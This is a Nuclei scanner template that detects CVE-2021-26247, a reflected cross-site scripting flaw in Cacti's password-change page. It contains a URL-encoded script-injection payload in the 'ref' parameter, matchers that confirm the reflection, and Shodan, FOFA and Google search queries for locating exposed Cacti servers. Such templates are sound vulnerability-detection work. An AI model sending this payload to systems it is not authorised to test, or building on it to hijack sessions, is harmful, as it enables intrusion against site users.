id: CVE-2021-26247

info:
  name: Cacti - Cross-Site Scripting
  author: dhiyaneshDK
  severity: medium
  description: Cacti contains a cross-site scripting vulnerability via "http://<CACTI_SERVER>/auth_changepassword.php?ref=<script>alert(1)</script>" which can successfully execute the JavaScript payload present in the "ref" URL parameter.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches or upgrade to a patched version of Cacti to mitigate this vulnerability.
  reference:
    - https://www.cacti.net/info/changelog
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26247
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-26247
    cwe-id: CWE-79
    epss-score: 0.31022
    epss-percentile: 0.96596
    cpe: cpe:2.3:a:cacti:cacti:0.8.7g:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: cacti
    product: cacti
    shodan-query:
      - http.title:"login to cacti"
      - http.title:"cacti"
      - http.favicon.hash:"-1797138069"
    fofa-query:
      - icon_hash="-1797138069"
      - title="cacti"
      - title="login to cacti"
    google-query:
      - intitle:"cacti"
      - intitle:"login to cacti"
  tags: cve,cve2021,cacti,xss

http:
  - method: GET
    path:
      - '{{BaseURL}}/auth_changepassword.php?ref=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"></script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502200bd2936afde6123d28481fb04c139d53e629ecd1a8ba696bf72cb4a7b4ccb44a022100e49117a6a2807e4f4a516bcb87579aefac91a41d5377904d776b0769013f9ab9:922c64590222798bb761d5b6d8e72950